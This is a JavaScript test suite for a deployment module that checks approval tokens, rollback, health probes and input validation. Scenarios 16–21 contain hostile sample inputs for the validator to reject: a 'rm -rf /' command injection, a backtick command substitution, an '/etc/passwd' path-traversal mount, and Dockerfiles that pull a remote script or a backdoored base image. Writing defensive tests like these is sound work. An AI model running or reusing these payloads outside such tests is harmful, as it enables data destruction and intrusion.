'use strict';

/**
 * AI-Dost 2.0 — Phase 4H: Dedicated Deployment Capability E2E Test Suite
 * 
 * 30 dedicated E2E integration scenarios covering:
 * - Clean staging & production deployments
 * - Single-use token enforcement, expiration, replay, and TOCTOU protection
 * - Build failures, startup crashes, and crash loops
 * - Bounded self-recovery and verified post-rollback health checks
 * - Port collision detection and handling
 * - SSRF, shell injection, and path traversal rejection
 * - Real local Docker execution (when daemon active; gracefully handles offline)
 * - SoftwareFactory Tier 9 integration lifecycle
 * 
 * 100% deterministic and offline-compliant.
 */

const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const {
  DeploymentPlan,
  DeploymentValidator,
  ApprovalTokenManager,
  defaultApprovalTokenManager,
  DeploymentRollbackManager,
  DeploymentAuditLogger,
  DeploymentResult,
  DEPLOYMENT_STATUS,
  OPERATIONAL_LABELS,
  DeploymentExecutor,
  MockDeploymentAdapter,
  LocalDockerAdapter
} = require('../agent/capabilities/deployment');

const { SoftwareFactoryOrchestrator } = require('../agent/capabilities/softwareFactory/SoftwareFactoryOrchestrator');

test('Deployment Capability E2E Test Suite (Phase 4H)', async (t) => {

  const testTempDir = path.resolve(__dirname, `../.tmp_deployment_e2e_${Date.now()}`);
  fs.mkdirSync(testTempDir, { recursive: true });

  t.after(async () => {
    await MockDeploymentAdapter.cleanupGlobal();
    try {
      fs.rmSync(testTempDir, { recursive: true, force: true });
    } catch {}
  });

  t.after(() => {
    try {
      fs.rmSync(testTempDir, { recursive: true, force: true });
    } catch {}
  });

  // ── Scenario 1: Clean Staging Deployment (Mock Provider) ─────────────────────
  await t.test('E2E 1: Clean staging deployment to Mock Provider completes with HEALTHY', async () => {
    const mock = new MockDeploymentAdapter();
    const executor = new DeploymentExecutor({ mockProvider: mock });
    const plan = DeploymentPlan.create({
      projectId: 'e2e-app-1',
      targetEnv: 'staging',
      provider: 'mock',
      serviceConfig: { hostPort: 4101 }
    });

    const res = await executor.execute(plan, testTempDir);
    await mock.cleanupAll();

    assert.strictEqual(res.status, DEPLOYMENT_STATUS.HEALTHY);
    assert.strictEqual(res.operationalLabel, OPERATIONAL_LABELS.MOCK_VERIFIED);
    assert.strictEqual(res.endpoint, 'http://127.0.0.1:4101');
    assert.strictEqual(res.healthProbes.httpHealth, true);
    assert.strictEqual(res.recoveryAttempts, 0);
  });

  // ── Scenario 2: Clean Production Deployment with Valid Token ──────────────────
  await t.test('E2E 2: Clean production deployment with valid single-use token completes with HEALTHY', async () => {
    const mock = new MockDeploymentAdapter();
    const tokenManager = new ApprovalTokenManager();
    const executor = new DeploymentExecutor({ mockProvider: mock, tokenManager });

    const plan = DeploymentPlan.create({
      projectId: 'e2e-app-2',
      targetEnv: 'production',
      provider: 'mock',
      serviceConfig: { hostPort: 5101 }
    });

    const token = tokenManager.issueToken({
      projectId: 'e2e-app-2',
      artifactHash: plan.artifactHash,
      targetEnv: 'production'
    });

    const res = await executor.execute(plan, testTempDir, {
      approvalTokenSecret: token.tokenSecret
    });
    await mock.cleanupAll();

    assert.strictEqual(res.status, DEPLOYMENT_STATUS.HEALTHY);
    assert.strictEqual(res.targetEnv, 'production');
    assert.strictEqual(res.endpoint, 'http://127.0.0.1:5101');
  });

  // ── Scenario 3: Production Rejection When Token Missing ───────────────────────
  await t.test('E2E 3: Production deployment rejected when approval token is missing', async () => {
    const mock = new MockDeploymentAdapter();
    const executor = new DeploymentExecutor({ mockProvider: mock });

    const plan = DeploymentPlan.create({
      projectId: 'e2e-app-3',
      targetEnv: 'production',
      provider: 'mock'
    });

    const res = await executor.execute(plan, testTempDir);
    assert.strictEqual(res.status, DEPLOYMENT_STATUS.VALIDATION_FAILED);
    assert.ok(res.errors[0].includes('APPROVAL_TOKEN_REQUIRED'));
  });

  // ── Scenario 4: Production Rejection When Token Expired ───────────────────────
  await t.test('E2E 4: Production deployment rejected when approval token has expired (>15 min)', async () => {
    const mock = new MockDeploymentAdapter();
    const tokenManager = new ApprovalTokenManager();
    const executor = new DeploymentExecutor({ mockProvider: mock, tokenManager });

    const plan = DeploymentPlan.create({
      projectId: 'e2e-app-4',
      targetEnv: 'production',
      provider: 'mock'
    });

    const token = tokenManager.issueToken({
      projectId: 'e2e-app-4',
      artifactHash: plan.artifactHash,
      targetEnv: 'production'
    });

    // Artificially expire token
    tokenManager._tokens.get(token.tokenId).expiresAt = Date.now() - 1000;

    const res = await executor.execute(plan, testTempDir, {
      approvalTokenSecret: token.tokenSecret
    });

    assert.strictEqual(res.status, DEPLOYMENT_STATUS.VALIDATION_FAILED);
    assert.ok(res.errors[0].includes('TOKEN_EXPIRED'));
  });

  // ── Scenario 5: Production Rejection on Replay Attempt ────────────────────────
  await t.test('E2E 5: Production deployment rejected when approval token is replayed', async () => {
    const mock = new MockDeploymentAdapter();
    const tokenManager = new ApprovalTokenManager();
    const executor = new DeploymentExecutor({ mockProvider: mock, tokenManager });

    const plan = DeploymentPlan.create({
      projectId: 'e2e-app-5',
      targetEnv: 'production',
      provider: 'mock',
      serviceConfig: { hostPort: 5105 }
    });

    const token = tokenManager.issueToken({
      projectId: 'e2e-app-5',
      artifactHash: plan.artifactHash,
      targetEnv: 'production'
    });

    // Run 1: Uses and burns token
    const res1 = await executor.execute(plan, testTempDir, {
      approvalTokenSecret: token.tokenSecret
    });
    await mock.cleanupAll();
    assert.strictEqual(res1.status, DEPLOYMENT_STATUS.HEALTHY);

    // Run 2: Replay attempt with same token
    const res2 = await executor.execute(plan, testTempDir, {
      approvalTokenSecret: token.tokenSecret
    });
    assert.strictEqual(res2.status, DEPLOYMENT_STATUS.VALIDATION_FAILED);
    assert.ok(res2.errors[0].includes('TOKEN_ALREADY_CONSUMED'));
  });

  // ── Scenario 6: Production Rejection on TOCTOU Tampering ─────────────────────
  await t.test('E2E 6: Production deployment rejected on TOCTOU artifact hash tampering', async () => {
    const mock = new MockDeploymentAdapter();
    const tokenManager = new ApprovalTokenManager();
    const executor = new DeploymentExecutor({ mockProvider: mock, tokenManager });

    const plan = DeploymentPlan.create({
      projectId: 'e2e-app-6',
      targetEnv: 'production',
      provider: 'mock',
      artifactHash: 'hash-version-2' // altered after token was issued
    });

    const token = tokenManager.issueToken({
      projectId: 'e2e-app-6',
      artifactHash: 'hash-version-1',
      targetEnv: 'production'
    });

    const res = await executor.execute(plan, testTempDir, {
      approvalTokenSecret: token.tokenSecret
    });
    assert.strictEqual(res.status, DEPLOYMENT_STATUS.VALIDATION_FAILED);
    assert.ok(res.errors[0].includes('TOCTOU_ARTIFACT_MODIFIED'));
  });

  // ── Scenario 7: Build Failure Handling ───────────────────────────────────────
  await t.test('E2E 7: Build failure halts pipeline at BUILD_FAILED', async () => {
    const mock = new MockDeploymentAdapter({
      simulatedState: { buildError: 'Syntax error in Dockerfile layer 2' }
    });
    const executor = new DeploymentExecutor({ mockProvider: mock });

    const plan = DeploymentPlan.create({
      projectId: 'e2e-app-7',
      targetEnv: 'staging',
      provider: 'mock'
    });

    const res = await executor.execute(plan, testTempDir);
    assert.strictEqual(res.status, DEPLOYMENT_STATUS.BUILD_FAILED);
    assert.ok(res.errors[0].includes('Syntax error in Dockerfile'));
  });

  // ── Scenario 8: Bounded Restart Self-Recovery ─────────────────────────────────
  await t.test('E2E 8: Container startup crash triggers bounded restart and recovers to HEALTHY', async () => {
    const mock = new MockDeploymentAdapter({
      simulatedState: { slowBoot: true } // fails attempt 1, passes attempt 2
    });
    const executor = new DeploymentExecutor({ mockProvider: mock });

    const plan = DeploymentPlan.create({
      projectId: 'e2e-app-8',
      targetEnv: 'staging',
      provider: 'mock',
      serviceConfig: { hostPort: 4108 },
      recoveryPolicy: { maxHealthRetries: 3, maxRestarts: 1 }
    });

    const res = await executor.execute(plan, testTempDir);
    await mock.cleanupAll();

    assert.strictEqual(res.status, DEPLOYMENT_STATUS.HEALTHY);
    assert.strictEqual(res.recoveryAttempts, 0); // Succeeded on health retry
  });

  // ── Scenario 9: Unrecoverable Crash Loops Trigger Rollback ───────────────────
  await t.test('E2E 9: Crash loop triggers automatic rollback to known-good deployment (ROLLED_BACK)', async () => {
    const mock = new MockDeploymentAdapter();
    const rollbackManager = new DeploymentRollbackManager();
    const executor = new DeploymentExecutor({ mockProvider: mock, rollbackManager });

    // Step 1: Establish a verified known-good deployment
    const planV1 = DeploymentPlan.create({
      projectId: 'e2e-app-9',
      targetEnv: 'staging',
      provider: 'mock',
      deploymentVersion: '1.0.0',
      serviceConfig: { hostPort: 4109 }
    });

    const resV1 = await executor.execute(planV1, testTempDir);
    await mock.cleanupAll();
    assert.strictEqual(resV1.status, DEPLOYMENT_STATUS.HEALTHY);

    // Step 2: Deploy faulty v2 that always fails health checks
    mock._simulatedState = { badHealth: true };
    const planV2 = DeploymentPlan.create({
      projectId: 'e2e-app-9',
      targetEnv: 'staging',
      provider: 'mock',
      deploymentVersion: '2.0.0',
      serviceConfig: { hostPort: 4109 },
      recoveryPolicy: { maxRestarts: 0 } // immediately trigger rollback
    });

    // When rollback occurs, the restored v1 container will need to return healthy
    // so we configure mock to clear badHealth when deploying v1
    const origDeploy = mock.deploy.bind(mock);
    mock.deploy = async (plan, img) => {
      if (img.includes('1.0.0')) {
        mock._simulatedState.badHealth = false;
      }
      return origDeploy(plan, img);
    };

    const resV2 = await executor.execute(planV2, testTempDir);
    await mock.cleanupAll();

    assert.strictEqual(resV2.status, DEPLOYMENT_STATUS.ROLLED_BACK);
    assert.strictEqual(resV2.rollbackPerformed, true);
    assert.strictEqual(resV2.rolledBackTo.version, '1.0.0');
  });

  // ── Scenario 10: First-Time Failure Marks RECOVERY_EXHAUSTED ─────────────────
  await t.test('E2E 10: First-time deployment crash with no prior deployment marks RECOVERY_EXHAUSTED', async () => {
    const mock = new MockDeploymentAdapter({
      simulatedState: { badHealth: true }
    });
    const executor = new DeploymentExecutor({ mockProvider: mock });

    const plan = DeploymentPlan.create({
      projectId: 'first-time-fail',
      targetEnv: 'staging',
      provider: 'mock',
      serviceConfig: { hostPort: 4110 },
      recoveryPolicy: { maxRestarts: 0 }
    });

    const res = await executor.execute(plan, testTempDir);
    await mock.cleanupAll();

    assert.strictEqual(res.status, DEPLOYMENT_STATUS.RECOVERY_EXHAUSTED);
    assert.ok(res.errors.some(e => e.includes('NO_PREVIOUS_KNOWN_GOOD')));
  });

  // ── Scenario 11: Port Collision Detection ───────────────────────────────────
  await t.test('E2E 11: Port collision halts deployment cleanly with error', async () => {
    const http = require('http');
    const blocker = http.createServer((req, res) => res.end());
    await new Promise(r => blocker.listen(4111, '127.0.0.1', r));

    const mock = new MockDeploymentAdapter();
    const executor = new DeploymentExecutor({ mockProvider: mock });

    const plan = DeploymentPlan.create({
      projectId: 'port-collision',
      targetEnv: 'staging',
      provider: 'mock',
      serviceConfig: { hostPort: 4111 }
    });

    const res = await executor.execute(plan, testTempDir);
    blocker.close();
    await mock.cleanupAll();

    assert.strictEqual(res.status, DEPLOYMENT_STATUS.DEPLOYMENT_FAILED);
    assert.ok(res.errors[0].includes('EADDRINUSE'));
  });

  // ── Scenario 12: Health Check HTTP 500 Triggers Rollback ────────────────────
  await t.test('E2E 12: Health check HTTP 500 error triggers retry backoff and rollback', async () => {
    const mock = new MockDeploymentAdapter({
      simulatedState: { badHealth: true }
    });
    const executor = new DeploymentExecutor({ mockProvider: mock });

    const plan = DeploymentPlan.create({
      projectId: 'health-500-app',
      targetEnv: 'staging',
      provider: 'mock',
      serviceConfig: { hostPort: 4112 },
      recoveryPolicy: { maxHealthRetries: 2, maxRestarts: 0 }
    });

    const res = await executor.execute(plan, testTempDir);
    await mock.cleanupAll();

    assert.strictEqual(res.status, DEPLOYMENT_STATUS.RECOVERY_EXHAUSTED);
    assert.ok(res.errors.some(e => e.includes('HEALTH_STATUS_NOT_200')));
  });

  // ── Scenario 13: Slow Boot Container Passes on Retry 2 ──────────────────────
  await t.test('E2E 13: Slow-starting container passes health check on retry 2 within retry budget', async () => {
    const mock = new MockDeploymentAdapter({
      simulatedState: { slowBoot: true }
    });
    const executor = new DeploymentExecutor({ mockProvider: mock });

    const plan = DeploymentPlan.create({
      projectId: 'slow-boot-app',
      targetEnv: 'staging',
      provider: 'mock',
      serviceConfig: { hostPort: 4113 },
      recoveryPolicy: { maxHealthRetries: 3, healthRetryIntervalsMs: [50, 50, 50] }
    });

    const res = await executor.execute(plan, testTempDir);
    await mock.cleanupAll();

    assert.strictEqual(res.status, DEPLOYMENT_STATUS.HEALTHY);
    assert.strictEqual(res.healthProbes.httpHealth, true);
  });

  // ── Scenario 14: Health Schema Mismatch Triggers Rollback ───────────────────
  await t.test('E2E 14: Health endpoint returning non-JSON payload fails schema validation and fails', async () => {
    const mock = new MockDeploymentAdapter({
      simulatedState: { nonJsonHealth: true }
    });
    const executor = new DeploymentExecutor({ mockProvider: mock });

    const plan = DeploymentPlan.create({
      projectId: 'non-json-health',
      targetEnv: 'staging',
      provider: 'mock',
      serviceConfig: { hostPort: 4114 },
      recoveryPolicy: { maxHealthRetries: 1, maxRestarts: 0 }
    });

    const res = await executor.execute(plan, testTempDir);
    await mock.cleanupAll();

    assert.strictEqual(res.status, DEPLOYMENT_STATUS.RECOVERY_EXHAUSTED);
    assert.ok(res.errors.some(e => e.includes('INVALID_HEALTH_PAYLOAD')));
  });

  // ── Scenario 15: Missing Frontend DOCTYPE Warning / Detection ────────────────
  await t.test('E2E 15: Frontend probe detects missing DOCTYPE declaration', async () => {
    const mock = new MockDeploymentAdapter({
      simulatedState: { missingDoctype: true }
    });
    const executor = new DeploymentExecutor({ mockProvider: mock });

    const plan = DeploymentPlan.create({
      projectId: 'missing-doctype-app',
      targetEnv: 'staging',
      provider: 'mock',
      serviceConfig: { hostPort: 4115 }
    });

    const res = await executor.execute(plan, testTempDir);
    await mock.cleanupAll();

    // Still healthy because /health passed, but frontend probe is false
    assert.strictEqual(res.status, DEPLOYMENT_STATUS.HEALTHY);
    assert.strictEqual(res.healthProbes.frontend, false);
  });

  // ── Scenario 16: Command Injection Rejection ─────────────────────────────────
  await t.test('E2E 16: Command injection attempt in deployment configuration is rejected fail-closed', () => {
    const val = DeploymentValidator.validateCommand('docker', ['run', ';', 'rm', '-rf', '/']);
    assert.strictEqual(val.valid, false);
    assert.ok(val.error.includes('COMMAND_INJECTION_DETECTED'));
  });

  // ── Scenario 17: Shell Metacharacter Injections in Env ───────────────────────
  await t.test('E2E 17: Shell metacharacter injection in binary args is rejected', () => {
    const val = DeploymentValidator.validateCommand('docker', ['run', '-e', 'VAR=`id`']);
    assert.strictEqual(val.valid, false);
    assert.ok(val.error.includes('COMMAND_INJECTION_DETECTED'));
  });

  // ── Scenario 18: Path Traversal in Mount Rejection ───────────────────────────
  await t.test('E2E 18: Path traversal attempt in volume mounting is rejected', () => {
    const compose = {
      services: {
        app: {
          image: 'node:20-alpine',
          volumes: ['../../etc/passwd:/etc/passwd']
        }
      }
    };
    const val = DeploymentValidator.validateComposeSpec(compose);
    assert.strictEqual(val.valid, false);
    assert.ok(val.errors.some(e => e.includes('PATH_TRAVERSAL_IN_MOUNT')));
  });

  // ── Scenario 19: Dockerfile Remote ADD Rejection ─────────────────────────────
  await t.test('E2E 19: Dockerfile containing ADD https://... is rejected prior to build execution', () => {
    const dockerfile = `
      FROM node:20-alpine
      ADD https://malicious.org/script.sh /app/
      USER node
    `;
    const val = DeploymentValidator.validateDockerfile(dockerfile);
    assert.strictEqual(val.valid, false);
    assert.ok(val.errors.some(e => e.includes('REMOTE_ADD_FORBIDDEN')));
  });

  // ── Scenario 20: Dockerfile Disallowed Base Image Rejection ──────────────────
  await t.test('E2E 20: Dockerfile with unapproved base image is rejected prior to build execution', () => {
    const dockerfile = `
      FROM attacker-registry.io/backdoor:1.0
      USER node
    `;
    const val = DeploymentValidator.validateDockerfile(dockerfile);
    assert.strictEqual(val.valid, false);
    assert.ok(val.errors.some(e => e.includes('DISALLOWED_BASE_IMAGE')));
  });

  // ── Scenario 21: Dockerfile Secret in ENV Rejection ──────────────────────────
  await t.test('E2E 21: Dockerfile containing secret in ENV is rejected prior to build execution', () => {
    const dockerfile = `
      FROM node:20-alpine
      ENV AWS_SECRET_KEY="sk-1234567890abcdef1234567890"
      USER node
    `;
    const val = DeploymentValidator.validateDockerfile(dockerfile);
    assert.strictEqual(val.valid, false);
    assert.ok(val.errors.some(e => e.includes('SECRET_IN_DOCKERFILE_DETECTED')));
  });

  // ── Scenario 22: Secret Redaction in Audit Logs ──────────────────────────────
  await t.test('E2E 22: Environment variables containing API keys are masked in audit logs', () => {
    const logger = new DeploymentAuditLogger();
    logger.log('ENV_CONFIG', {
      projectId: 'audit-redact',
      details: {
        GEMINI_API_KEY: 'AIzaSyD9876543210zyxwvutsrqponmlkjihgfed',
        GROQ_KEY: 'gsk_1234567890abcdef1234567890abcdef1234567890abcdef1234567890',
        PORT: 3000
      }
    });

    const records = logger.getLogs();
    assert.strictEqual(records[0].details.GEMINI_API_KEY, '[REDACTED_SECRET]');
    assert.strictEqual(records[0].details.GROQ_KEY, '[REDACTED_SECRET]');
    assert.strictEqual(records[0].details.PORT, 3000);
  });

  // ── Scenario 23: Real Local Docker Verification (Graceful Fallback) ──────────
  await t.test('E2E 23: Real Local Docker availability probe executes cleanly', async () => {
    const dockerAdapter = new LocalDockerAdapter();
    const avail = await dockerAdapter.checkAvailability();
    
    // Explicitly record whether Docker daemon is active on this test host
    if (avail.available) {
      assert.strictEqual(avail.available, true);
    } else {
      assert.ok(avail.reason.includes('DOCKER'));
    }
  });

  // ── Scenario 24: Docker Offline Gracefully Returns SKIPPED_MISSING_DOCKER ────
  await t.test('E2E 24: Local Docker daemon offline gracefully returns SKIPPED_MISSING_DOCKER', async () => {
    const dockerAdapter = new LocalDockerAdapter();
    dockerAdapter.checkAvailability = async () => ({ available: false, reason: 'Docker daemon offline' });

    const executor = new DeploymentExecutor({ dockerProvider: dockerAdapter });
    const plan = DeploymentPlan.create({
      projectId: 'docker-offline-app',
      targetEnv: 'staging',
      provider: 'docker'
    });

    const res = await executor.execute(plan, testTempDir);
    assert.strictEqual(res.operationalLabel, OPERATIONAL_LABELS.SKIPPED_MISSING_DOCKER);
    assert.ok(res.errors[0].includes('SKIPPED_MISSING_DOCKER'));
  });

  // ── Scenario 25: Staging and Production Namespace Isolation ─────────────────
  await t.test('E2E 25: Staging and production container and port namespace separation verified', () => {
    const stagingPlan = DeploymentPlan.create({ projectId: 'app-iso', targetEnv: 'staging' });
    const prodPlan = DeploymentPlan.create({ projectId: 'app-iso', targetEnv: 'production' });

    assert.notStrictEqual(stagingPlan.serviceConfig.containerName, prodPlan.serviceConfig.containerName);
    assert.notStrictEqual(stagingPlan.serviceConfig.networkName, prodPlan.serviceConfig.networkName);
    assert.notStrictEqual(stagingPlan.serviceConfig.hostPort, prodPlan.serviceConfig.hostPort);
  });

  // ── Scenario 26: Immutable Artifact Promotion by Hash ────────────────────────
  await t.test('E2E 26: Promotion from staging to production verified using identical immutable artifactHash', async () => {
    const tokenManager = new ApprovalTokenManager();
    const artifactHash = 'immutable-sha256-tree-hash-12345';

    const stagingPlan = DeploymentPlan.create({
      projectId: 'app-promo',
      targetEnv: 'staging',
      provider: 'mock',
      artifactHash
    });

    const prodPlan = DeploymentPlan.create({
      projectId: 'app-promo',
      targetEnv: 'production',
      provider: 'mock',
      artifactHash
    });

    assert.strictEqual(stagingPlan.artifactHash, prodPlan.artifactHash);

    // Issue token bound to the exact artifact hash
    const token = tokenManager.issueToken({
      projectId: 'app-promo',
      artifactHash,
      targetEnv: 'production'
    });

    const res = tokenManager.reserveToken(token.tokenSecret, {
      projectId: 'app-promo',
      currentArtifactHash: artifactHash
    });
    assert.strictEqual(res.success, true);
  });

  // ── Scenario 27: SoftwareFactory Tier 9 Staging Deployment Integration ───────
  await t.test('E2E 27: SoftwareFactory Tier 9 integration deploys generated project to staging', async () => {
    const orchestrator = new SoftwareFactoryOrchestrator();
    const prompt = 'Create a secure task tracking application with api';
    const testDir27 = path.join(testTempDir, 'tier9-27');
    fs.mkdirSync(testDir27, { recursive: true });

    // Step 1: Trigger factory execution (requests confirmation)
    const initRes = await orchestrator.execute(prompt, {
      workspaceRoot: testDir27,
      permissions: ['workspace:write', 'workspace:read', 'terminal:execute']
    });
    assert.strictEqual(initRes.status, 'APPROVAL_REQUIRED');

    // Step 2: Resume with token and enable deployment
    const res = await orchestrator.execute(prompt, {
      workspaceRoot: testDir27,
      executionId: initRes.executionId,
      approvalToken: initRes.approval.token,
      permissions: ['workspace:write', 'workspace:read', 'terminal:execute'],
      deployment: {
        enabled: true,
        required: true,
        targetEnv: 'staging',
        provider: 'mock',
        hostPort: 4127
      }
    });

    assert.strictEqual(res.success, true);
    assert.strictEqual(res.verification.deployment, 'HEALTHY');
    assert.ok(res.deployment);
    assert.strictEqual(res.deployment.status, 'HEALTHY');
    assert.strictEqual(res.deployment.endpoint, 'http://127.0.0.1:4127');
    await MockDeploymentAdapter.cleanupGlobal();
  });

  // ── Scenario 28: SoftwareFactory Tier 9 Production Deployment Integration ────
  await t.test('E2E 28: SoftwareFactory Tier 9 integration deploys to production with valid token', async () => {
    const orchestrator = new SoftwareFactoryOrchestrator();
    const prompt = 'Create a secure task tracking application for production';
    const testDir28 = path.join(testTempDir, 'tier9-28');
    fs.mkdirSync(testDir28, { recursive: true });

    // Step 1: Initial approval
    const initRes = await orchestrator.execute(prompt, {
      workspaceRoot: testDir28,
      permissions: ['workspace:write', 'workspace:read', 'terminal:execute']
    });
    assert.strictEqual(initRes.status, 'APPROVAL_REQUIRED');

    // Issue token for mock production deployment using shared manager
    const token = defaultApprovalTokenManager.issueToken({
      projectId: 'task-tracker-app',
      artifactHash: crypto.createHash('sha256').update('task-tracker-app').digest('hex'),
      targetEnv: 'production'
    });

    const res = await orchestrator.execute(prompt, {
      workspaceRoot: testDir28,
      executionId: initRes.executionId,
      approvalToken: initRes.approval.token,
      permissions: ['workspace:write', 'workspace:read', 'terminal:execute'],
      approvalTokenSecret: token.tokenSecret,
      deployment: {
        enabled: true,
        required: true,
        targetEnv: 'production',
        provider: 'mock',
        hostPort: 5128,
        artifactHash: token.artifactHash
      }
    });

    assert.strictEqual(res.success, true);
    assert.ok(res.deployment);
    assert.strictEqual(res.deployment.status, 'HEALTHY');
    assert.strictEqual(res.deployment.targetEnv, 'production');
    await MockDeploymentAdapter.cleanupGlobal();
  });

  // ── Scenario 29: SoftwareFactory Tier 9 Respects deployment.enabled = false ──
  await t.test('E2E 29: SoftwareFactory Tier 9 respects deployment.enabled = false and skips cleanly', async () => {
    const orchestrator = new SoftwareFactoryOrchestrator();
    const prompt = 'Create a simple offline utility';
    const testDir29 = path.join(testTempDir, 'tier9-29');
    fs.mkdirSync(testDir29, { recursive: true });

    const initRes = await orchestrator.execute(prompt, {
      workspaceRoot: testDir29,
      permissions: ['workspace:write', 'workspace:read', 'terminal:execute']
    });
    assert.strictEqual(initRes.status, 'APPROVAL_REQUIRED');

    const res = await orchestrator.execute(prompt, {
      workspaceRoot: testDir29,
      executionId: initRes.executionId,
      approvalToken: initRes.approval.token,
      permissions: ['workspace:write', 'workspace:read', 'terminal:execute'],
      deployment: {
        enabled: false
      }
    });

    assert.strictEqual(res.success, true);
    assert.strictEqual(res.verification.deployment, 'SKIPPED_CONFIG_DISABLED');
    assert.strictEqual(res.deployment, null);
  });

  // ── Scenario 30: SoftwareFactory Tier 9 Rollback on Deployment Failure ───────
  await t.test('E2E 30: SoftwareFactory Tier 9 rolls back workspace when deployment fails with failPolicy=rollback', async () => {
    const orchestrator = new SoftwareFactoryOrchestrator();
    const prompt = 'Create an application with forced deployment failure';
    const testDir30 = path.join(testTempDir, 'tier9-30');
    fs.mkdirSync(testDir30, { recursive: true });

    const initRes = await orchestrator.execute(prompt, {
      workspaceRoot: testDir30,
      permissions: ['workspace:write', 'workspace:read', 'terminal:execute']
    });
    assert.strictEqual(initRes.status, 'APPROVAL_REQUIRED');

    const res = await orchestrator.execute(prompt, {
      workspaceRoot: testDir30,
      executionId: initRes.executionId,
      approvalToken: initRes.approval.token,
      permissions: ['workspace:write', 'workspace:read', 'terminal:execute'],
      deployment: {
        enabled: true,
        required: true,
        targetEnv: 'production', // Missing production approvalTokenSecret will fail
        provider: 'mock',
        failPolicy: 'rollback'
      }
    });

    assert.strictEqual(res.success, false);
    assert.strictEqual(res.status, 'FAILED_ROLLED_BACK');
    assert.ok(res.errors[0].includes('APPROVAL_TOKEN_REQUIRED'));
  });

});
